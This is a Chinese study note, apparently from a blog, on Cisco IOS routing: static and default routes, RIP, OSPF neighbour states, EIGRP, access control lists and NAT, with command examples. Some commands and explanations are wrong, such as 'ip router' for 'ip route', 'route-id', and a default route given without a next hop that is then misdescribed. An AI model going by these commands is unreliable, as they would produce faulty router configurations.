href="#路由" class="headerlink" title="路由"></a>路由</h1><hr><h2 id="路由介绍"><a href="#路由介绍" class="headerlink" title="路由介绍"></a>路由介绍</h2><ul><li>跨越从源主机到目标主机的一个互联网络来转发数据包的过程</li></ul><hr><h2 id="路由器的工作原理"><a href="#路由器的工作原理" class="headerlink" title="路由器的工作原理"></a>路由器的工作原理</h2><ol><li>主机1.1要发送数据包给主机4.1，因为IP地址<strong>不在同一网段</strong> ，主机会将数据包发送给<strong>本网段的网关路由器A</strong></li><li>路由器A接收到数据包，查看数据包IP首部中的<strong>目标IP地址</strong> ，再查找自己的路由表 。数据包的目标IP地址是4.1，属于4.0网段，路由器A在路由表中查到4.0网段转发的接口是<strong>S0接口</strong> 。于是，路由器A将数据包<strong>从S0接口</strong>转发出去</li><li>网络中的毎个路由器都是按这样的步骤去转发数据，直到到达了路由器B，用同样的转发方法，从E0口转发出去，4.1主机接收到这个数据包</li></ol><p><img src="/jwimg/1650894508669-2fc1ff40-ebe9-4f86-a14d-63671bf6140f.png" alt="avatar"></p><hr><h2 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h2><p><a href="https://baike.baidu.com/item/%E8%B7%AF%E7%94%B1%E8%A1%A8/2707408">路由表</a>指存储在路由器中的一种数据库 其包含着指向特定网络地址的路径与出接口</p><p>路由表的形成</p><ol><li>直连网段：配置IP地址→端口处于UP状态→形成直连路由</li><li>非直连网段：对于非直连的网段，需要<strong>静态路由</strong>或<strong>动态路由</strong> ，将网段<strong>添加到路由表</strong> 中</li></ol><hr><h2 id="工程三招"><a href="#工程三招" class="headerlink" title="工程三招"></a>工程三招</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# no ip domain lookup//关闭域名解析(防止敲错命令查询)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# line console 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config-line)#logging synchronous//log当前显示信息同步</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config-line)#no exec-timeout//关闭会话超时，防止一段时间不操作自动退出</span><br></pre></td></tr></table></figure><hr><h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><ul><li>由管理员<strong>手工配置</strong>的，是<strong>单向</strong>的，缺乏灵活性</li><li>数据包如果要到达<strong>非直连网络</strong> 需要在路由表中填加条目，静态路由需要手动填加路由条目</li></ul><h3 id="静态路由配置"><a href="#静态路由配置" class="headerlink" title="静态路由配置"></a>静态路由配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# ip router 目的子网 子网掩码 下一跳的IP</span><br></pre></td></tr></table></figure><hr><h2 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h2><ul><li>当路由器在路由表中<strong>找不到目标网络</strong> 的路由条目时，路由器把请求转发到<strong>默认路由接口</strong></li><li>默认路由<strong>可以匹配所有网段</strong> ，但是其<strong>优先级最低</strong></li><li>当目标地址既匹配静态路由又匹配默认路由时，优选静态路由条目对应端口进行转发。当静态路由失效时，才匹配默认路由，根据默认路由进行转发</li></ul><h3 id="默认路由配置"><a href="#默认路由配置" class="headerlink" title="默认路由配置"></a>默认路由配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# ip route 0.0.0.0 0.0.0.0</span><br></pre></td></tr></table></figure><p>0.0.0.0是下一跳IP，代表任何网络</p><hr><hr><h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><p>指路由器能够根据路由器之间的交换的特定路由信息自动地建立自己的路由表，并且能够根据链路和节点的变化适时地进行自动调整。</p><p>动态路由<strong>不需要自己手工写路由，路由器之间能够自己相互学习</strong></p><p><strong>特点：</strong></p><ul><li>减少了管理任务</li><li>占用了网络带宽</li></ul><h3 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议"></a>RIP协议</h3><p>RIP(Routing Information Protocol)距离矢量协议</p><h4 id="RIPv1"><a href="#RIPv1" class="headerlink" title="RIPv1"></a>RIPv1</h4><p>有类路由协议 不支持变长子网掩码(VLSM)</p><p>更新方式为广播 不支持认证</p><p>每个更新包最大支持25条路由条目</p><p>路由表查询方式主类网段</p><p>不支持不连续子网</p><h4 id="RIPv2"><a href="#RIPv2" class="headerlink" title="RIPv2"></a>RIPv2</h4><p>无类路由协议 支持边长子网掩码(VLSM)</p><p>路由更新方式为多播，目的地址为224.0.0.9</p><p>支持明文及密文认证(思科私有)</p><p>路由表查询机制是由小类–&gt;大类（按位查询，最长匹配、精确匹配，先检查32位掩码的）</p><p>支持不连续子网</p><h4 id="动态路由配置-RIP"><a href="#动态路由配置-RIP" class="headerlink" title="动态路由配置(RIP)"></a>动态路由配置(RIP)</h4><p>1.启动RIP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# router rip</span><br></pre></td></tr></table></figure><p>2.RIP版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# version 2</span><br></pre></td></tr></table></figure><p>3.关闭自动汇总</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# no auto-summary</span><br></pre></td></tr></table></figure><p>4.宣告主网络号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# network 想通信的网段号</span><br></pre></td></tr></table></figure><p>5.退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)# exit</span><br></pre></td></tr></table></figure><hr><hr><h3 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h3><p>OSPF(Open Shortest Path First) 开放式最短路径优先协议</p><h4 id="OSPFv2"><a href="#OSPFv2" class="headerlink" title="OSPFv2"></a>OSPFv2</h4><ol><li>OSPF是一种无类路由协议，支持VLSM可变长子网掩码。支持IPV4和IPV6.</li><li>组播地址：224.0.0.5 224.0.0.6。</li><li>OSPF度量：从源到目的所有出接口的度量值，和接口带宽反比（10^8&#x2F;带宽）。</li><li>收敛速度极快，但大型网络配置很复杂。</li><li>IP封装，协议号89</li></ol><h4 id="OSPF区域"><a href="#OSPF区域" class="headerlink" title="OSPF区域"></a>OSPF区域</h4><p><strong>骨干区域（区域0）</strong>：骨干区域必须连接所有的非骨干区域，而且骨干区域不可分割，有且只有一个，一般情况下，骨干区域内没有终端用户。<br><strong>非骨干区域（非0区域）</strong>：非骨干区域一般根据实际情况而划分，必须连接到骨干区域（不规则区域也需通过tunnel或virtual-link连接到骨干区域）。一般情况下，费骨干区域主要连接终端用户和资源。</p><h4 id="报文类型"><a href="#报文类型" class="headerlink" title="报文类型"></a>报文类型</h4><p>OSPF的5种数据报文</p><p>1.Hello报文：周期性发送，用来发现和维持OSPF邻居关系。</p><p>2.DD报文：描述本地LSDB（Link State Database链路状态数据）的摘要信息，用于两台设备进行数据库同步。</p><p>3.LSR报文：用于向对方请求所需的LSA。</p><p>4.LSU报文：用于向对方发送其所需要的LSA。</p><p>5.LSAck报文：用来对收到的LSA进行确认。</p><h4 id="邻居状态机"><a href="#邻居状态机" class="headerlink" title="邻居状态机"></a>邻居状态机</h4><p><img src="/jwimg/1651498632820-e8da47b3-a6ce-49ee-86f9-14d8b9d92643.png" alt="avatar"></p><p><strong>Down</strong>：</p><p>开启了OSPF但是没有收到任何的OSPF报文，只会发送Hello报文（周期性10s）</p><p><strong>Attempt</strong>：</p><p>此状态只在NBMA网络上存在**(NBMA后面会提一下)**，表示没有收到邻居的任何信息，但是已经周期性的向邻居发送报文，发送间隔为（30s）HelloInterval。如果RouterDeadInterval（死亡）间隔（120s）内未收到邻居的Hello报文，则转为Down状态（相当于死亡，转为死亡状态，初始状态就是死亡状态（没有使用就是死亡）） （简单理解：手工配置了邻居，去找这个邻居，但是邻居还没有恢复你报文） 这种状态很难遇到，作为了解即可。</p><p><strong>Init</strong>：</p><p>接受到了邻居发送的HELLO报文，但是报文中的邻居信息没有存在我。 （最开始A喊：有人吗。B听到了知道A的存在，但是A不知道B的存在。）</p><p><strong>2-Way</strong>：</p><p>邻居状态的最高状态 接受到了邻居的HELLO报文，同时邻居的HELLO报文中存在我。 在DROther（代表了既不是DR、也不是ODR）之间最高只能是2-Way状态 （DR：指定路由器，负责收集分发LSA信息。虚拟出来的路由器，依附在实体路由器的接口上） （BDR：备份路由器，作为DR的备份，虚拟）（DR与ODR都是IP的时候讲的）</p><p><strong>ExStart</strong>：</p><p>形成邻接状态的第一步 开始交互DD报文，选举主从关系（就是选举DR,BDR） 报文不携带LSA头部</p><p><strong>Exchange</strong>：</p><p>主从关系选举完成 还是一样交互DD报文，此时DD报文携带LSA信息。交互完后根据情况进入Loading状态或Full状态。 （此时已经交换目录，然后要不要交换书籍看自己）</p><p><strong>Loading</strong>：</p><p>发现自己的LSDB不存在对方的部分LSA信息，所以发送LSR报文进行请求，接收到LSR的路由器，将回复LSU报文，当发出LSAck报文后进入Full状态<br><strong>Full</strong>：邻接状态 作为OSPF路由器之间关系的最高状态，代表了LSDB已经同步。</p><h4 id="OSPF配置"><a href="#OSPF配置" class="headerlink" title="OSPF配置"></a>OSPF配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R1(config)router ospf xxx(进程ID)</span><br><span class="line">R1(config-router)route-id x.x.x.x(route id每台路由器一个)</span><br><span class="line">R1(config-router)network x.x.x.x(网段号 一般是直连网段) x.x.x.x(反掩码) area xxx(区域号)</span><br><span class="line">R1(config-router)exit</span><br></pre></td></tr></table></figure><hr><h3 id="OSPF的建立过程"><a href="#OSPF的建立过程" class="headerlink" title="OSPF的建立过程"></a>OSPF的建立过程</h3><p>OSPF的建立过程可以简单分为以下3个过程</p><h4 id="建立邻居关系"><a href="#建立邻居关系" class="headerlink" title="建立邻居关系"></a>建立邻居关系</h4><p>双方路由器初始为down状态，连接之后进入init状态，开始互相交换hello数据包，通过hello报文得到路由器基本信息之后，进入two-way状态，开始建立邻居关系。邻居关系建立之后进入exstart状态</p><h4 id="建立各自的拓扑表"><a href="#建立各自的拓扑表" class="headerlink" title="建立各自的拓扑表"></a>建立各自的拓扑表</h4><p>进入exstart状态后确立主从关系，互相交换LSA摘要信息之后变为exchange状态</p><h4 id="建立邻接关系"><a href="#建立邻接关系" class="headerlink" title="建立邻接关系"></a>建立邻接关系</h4><p>正在同步lsdb（链路状态数据库），但还未同步完成，两台设备的关系是loading完成lsdb同步，进入full状态，成立邻接关系。</p><p>OSPF配置过程</p><hr><hr><h3 id="EIGRP协议"><a href="#EIGRP协议" class="headerlink" title="EIGRP协议"></a>EIGRP协议</h3><p>距离矢量和链路状态两种路由<strong>协议</strong>混合</p><h4 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R1(config)#router eigrp xxx(系统号)配置相同系统号要一样</span><br><span class="line">R1(config)#network 192.168.12.0(启用eigrp协议的端口IP) 0.0.0.255(反掩码)</span><br><span class="line">R1(config)#no auto-summary(关闭自动汇总)</span><br><span class="line">R2#show ip eigrp neighbors(查看邻居表)</span><br></pre></td></tr></table></figure><h4 id="配置EIGRP手工汇总"><a href="#配置EIGRP手工汇总" class="headerlink" title="配置EIGRP手工汇总"></a>配置EIGRP手工汇总</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R3(config)#interface fastetherent 0/0</span><br><span class="line">R3(config)#ip summary-address eigrp 100 172.16.32.0(汇总的IP网段) 255.255.252.0</span><br></pre></td></tr></table></figure><hr><hr><h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p>访问控制列表（Access Control List）是路由器和交换机接口的指令列表，用来控制端口进出的数据包</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>1<del>99和1300</del>1999：标准IP ACL（基于源IP地址过滤）ps:只能控制源IP是否允许通过路由器访问 不能根据目的IP控制</p><p>100<del>199和2000</del>2699：拓展IP ACL（基于源、目的IP地址过滤；源、目的TCP&#x2F;UDP端口；协议类型）可以控制允许源IP通过路由器访问某个网站但不能访问另一些控制列表里设定的网站</p><p>AppleTalk：600~699</p><p>IPX：800~899</p><h3 id="3P原则"><a href="#3P原则" class="headerlink" title="3P原则"></a>3P原则</h3><p>基于每种协议设置一个ACL（per protocol）</p><p>基于每个方向设置一个ACL（per direction）</p><p>基于每个接口设置一个ACL（per interface）</p><h3 id="ACL工作原理"><a href="#ACL工作原理" class="headerlink" title="ACL工作原理"></a>ACL工作原理</h3><p>入站ACL：对到来的分组进行处理后在路由到主站接口（也就是数据包传输到路由器的接口时让不让进就完了）</p><p>出站ACL：将分组路由到出站接口，然后根据ACL对其进行处理（就是数据包进路由器处理完要发出的时候在出接口处让不让出就完事了）</p><p>ACL要么作用于入接口要么作用于出接口</p><p>ACL顺序：从上到下、每次一条语句（每次都是从第一条开始判断）</p><hr><h3 id="ACL配置"><a href="#ACL配置" class="headerlink" title="ACL配置"></a>ACL配置</h3><p>1-99：标准ACL<br>100-199：扩展ACL<br><em><strong>ACl配置过程中一定要用反掩码！！！</strong></em></p><h4 id="标准访问控制列表的格式"><a href="#标准访问控制列表的格式" class="headerlink" title="标准访问控制列表的格式"></a>标准访问控制列表的格式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list access-list-number permit/deny [sourceaddress][wildcard-mask]</span><br></pre></td></tr></table></figure><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list 10  deny 192.168.1.1 0.0.0.255</span><br></pre></td></tr></table></figure><p>将来自192.168.1.0&#x2F;24的所有计算机数据包进行过滤丢弃</p><p><strong>标准访问列表配置实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R1(config)#access-list 10 deny 192.168.2.0 0.0.0.255</span><br><span class="line">R1(config)#access-list 10 permit any</span><br><span class="line">R1(config)#int fa0/0.1</span><br><span class="line">R1(config-subif)#ip access-group 10 out</span><br></pre></td></tr></table></figure><p>上面配置的含义是阻止来自网段192.168.2.0的机器从int fa0&#x2F;0.1端口出去，访问列表在配置好之后，要把它在端口上应用，否则配置了还是无效的</p><p><strong>删除已建立的标准ACL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1(config)#no access-list +access-list number</span><br></pre></td></tr></table></figure><p>对标准的ACL来说，不能删除单个acl语句，只能删除整个ACL</p><hr><h4 id="拓展访问控制列表的格式"><a href="#拓展访问控制列表的格式" class="headerlink" title="拓展访问控制列表的格式"></a>拓展访问控制列表的格式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list access-list-number permit/deny protocol +源地址+反码 +目标地址+反码+operan(It小于，gt大于，eq等于，neq不等于.)+端口号</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 deny tcp any host 192.168.1.1 eq www </span><br></pre></td></tr></table></figure><p>将所有主机访问192.168.1.1这个地址网页服务（WWW）TCP连接的数据包丢弃。</p><p><strong>拓展访问列表配置实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">R2(config)#access-list 110 deny tcp any host 192.168.1.12 eq www</span><br><span class="line">R2(config)#access-list 110 deny tcp any host 192.168.1.12 eq ftp</span><br><span class="line">R2(config)#int fa0/0</span><br><span class="line">R2(config-if)#ip access-group 110 out（将ACL110应用到端口）</span><br></pre></td></tr></table></figure><p>上面配置的含义是拒绝访问192.168.1.12的www和ftp服务</p><p><strong>删除已建立的扩展标准ACL</strong></p><p>和标准的一样，不能单条删除，只能删除整个ACL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2(config)#no access-list +access-list number </span><br><span class="line">R2(config)#no ip access-list +序号或者名字</span><br></pre></td></tr></table></figure><hr><h4 id="命令访问控制列表的格式"><a href="#命令访问控制列表的格式" class="headerlink" title="命令访问控制列表的格式"></a>命令访问控制列表的格式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip access-list &#123;standard/extended&#125; access-list-name(可有字母，数字组合的字符串)</span><br></pre></td></tr></table></figure><p>eg：ip access-list standard softer </p><p>建立一个名为softer的标准访问控制列表</p><p><strong>命名访问控制列表使用方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router（config）#ip access-list standard +自定义名</span><br><span class="line">router（config-std-nac1）#11 permit host +ip </span><br></pre></td></tr></table></figure><p>默认情况下第一条为10，第二条为20.如果不指定序列号，则新添加的ACL被添加到列表的末尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">router（config-std-nac1）#deny any</span><br></pre></td></tr></table></figure><p>对于命名ACL来说，可以向之前的ACL中插入ACL,删除也可以删除单条ACL，<br>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router（config）#ip access-list standard benet</span><br><span class="line">router(config-std-nasl)#no 11</span><br></pre></td></tr></table></figure><hr><p>使用show access-lists可查看配置的acl信息</p><hr><h2 id="NAT-网络地址转换"><a href="#NAT-网络地址转换" class="headerlink" title="NAT(网络地址转换)"></a>NAT(网络地址转换)</h2><p>通过将内部网络的私有IP地址翻译成全球唯一的公网IP地址，使内部网络可以连接到互联网等外部网络上。</p><hr><h3 id="NAT的优缺点"><a href="#NAT的优缺点" class="headerlink" title="NAT的优缺点"></a>NAT的优缺点</h3><p>优点：节省公有合法IP地址、处理地址重叠、增强灵活性、安全性</p><p>缺点：延迟增大、配置和维护的复杂性、不支持某些应用但可以通过静态NAT映射来避免</p><h3 id="NAT三种实现方式"><a href="#NAT三种实现方式" class="headerlink" title="NAT三种实现方式"></a>NAT三种实现方式</h3><h4 id="1、静态转换"><a href="#1、静态转换" class="headerlink" title="1、静态转换"></a>1、<strong>静态转换</strong></h4><p>IP地址一对一 内部网络设备统一使用一个公网IP与外网交流</p><p><strong>静态NAT配置</strong></p><p>全局模式下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source static 192.168.1.1(允许的某个内部地址) 61.0.0.2(公网IP)</span><br></pre></td></tr></table></figure><blockquote><p>inside source指的是内部的源地址</p></blockquote><p>在内外接口上启用NAT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">出口NAT:</span><br><span class="line">ip nat outside</span><br><span class="line">入口NAT:</span><br><span class="line">ip nat inside</span><br></pre></td></tr></table></figure><p>端口映射：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source static tcp 192.168.1.1 80 61.0.0.1 80</span><br><span class="line">//这里的tcp指的是协议 前后者80都指端口  61.0.0.1指的是内网网关在公网中所分配到的IP也就是与公网相连的端口IP</span><br></pre></td></tr></table></figure><hr><h4 id="2、动态转换"><a href="#2、动态转换" class="headerlink" title="2、动态转换"></a>2、动态转换</h4><p>IP地址随机对应，无确定值，所有想要访问公网的内网IP都会被随机转化为指定IP池内的随机公网IP</p><blockquote><p>仅当内网访问公网的设备数少于地址池中的IP数时适用</p></blockquote><p>动态NAT配置</p><p><strong>配置步骤</strong>：</p><p>全局模式下：</p><p>1、配置ACL，用于限定用作地址转换的内网地址范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list 1 permit 192.168.1.0 0.0.0.255(此处用反掩码哦！！！)</span><br></pre></td></tr></table></figure><p>2、配置公网所给予的地址池</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat pool dizhichi 61.10.0.1 61.10.0.10 netmask 255.255.255.240</span><br></pre></td></tr></table></figure><blockquote><p>这里定义的的是公网IP池范围61.10.0.1-61.10.0.10   地址池名字为 dizhichi</p></blockquote><p>3、设置ACL和地址池的映射关系，进行匹配地址转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source list 1 pool dizhichi</span><br></pre></td></tr></table></figure><p>4、设置内外接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside //入接口</span><br><span class="line">ip nat outside //出接口</span><br></pre></td></tr></table></figure><hr><h4 id="3、端口多路复用-PAT"><a href="#3、端口多路复用-PAT" class="headerlink" title="3、端口多路复用(PAT)"></a>3、端口多路复用(PAT)</h4><p>通过改变外出数据包的源IP地址和源端口进行端口转发,内网中的所有主机可以共享一个合法公网IP</p><p><strong>PAT配置</strong></p><p>全局模式下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source list 1 interface f0/1 overload</span><br></pre></td></tr></table></figure><blockquote><p>此处使用的ACL列表为上面的</p></blockquote><hr><h3 id="三种NAT的区别"><a href="#三种NAT的区别" class="headerlink" title="三种NAT的区别"></a>三种NAT的区别</h3><p>静态转换的对应关系一对一且不变,并且没有节约公网IP,只是隐藏了主机的真实地址</p><p>动态转换虽然在一定情况下节约了公网IP,但当内部网络同时访问公网的主机数大于合法地址池中的IP数量是就不适用了</p><p>端口多路复用可以使用所有内部网络主机共享一个合法公网IP,从而最大限度地节约了IP地址资源</p><h3 id="查看NAT转换条目"><a href="#查看NAT转换条目" class="headerlink" title="查看NAT转换条目"></a>查看NAT转换条目</h3><p>特权模式下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip nat translation //显示当前NAT转换表项</span><br></pre></td></tr></table></figure><h3 id="清除NAT转换条目"><a href="#清除NAT转换条目" class="headerlink" title="清除NAT转换条目"></a>清除NAT转换条目</h3><p>特权模式下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear ip nat translation //清除NAT转换表项中的所有条目(静态NAT条目木不会被清理)</span><br></pre></td></tr></table></figure><h3 id="NAT一些要注意的问题"><a href="#NAT一些要注意的问题" class="headerlink" title="NAT一些要注意的问题"></a>NAT一些要注意的问题</h3><p><strong>ACL阻止转发后的流量</strong><br><strong>进行地址转换的ACL不全</strong><br><strong>overload参数漏掉</strong><br><strong>不对称路由</strong>  &#x2F;&#x2F;指从主机A到B走过的路与从B到A不一样 即不对称<br><strong>动态地址池IP地址范围配置错误</strong><br><strong>动态地址池与静态转换地址重叠</strong><br><strong>inside和outside接口配置错误</strong></p>]]></content>
      
      
      <categories>
          
          <category> -计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -网络工程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
